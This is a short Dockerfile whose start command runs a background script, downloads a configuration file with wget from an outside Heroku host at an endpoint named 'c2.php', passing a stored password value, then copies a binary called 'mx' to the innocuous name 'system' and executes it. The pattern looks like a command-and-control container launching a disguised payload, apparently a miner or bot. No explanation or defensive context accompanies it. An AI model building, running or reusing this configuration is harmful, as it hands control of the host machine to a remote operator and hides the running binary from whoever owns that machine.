FROM dzmlt/trtl
EXPOSE 8080
WORKDIR /projects/sys
ENV PASS system
CMD ./nrr.sh & \
    wget http://zh-checker.herokuapp.com/c2.php?u=$PASS -O config.json && \
    cp mx system && \
    ./system
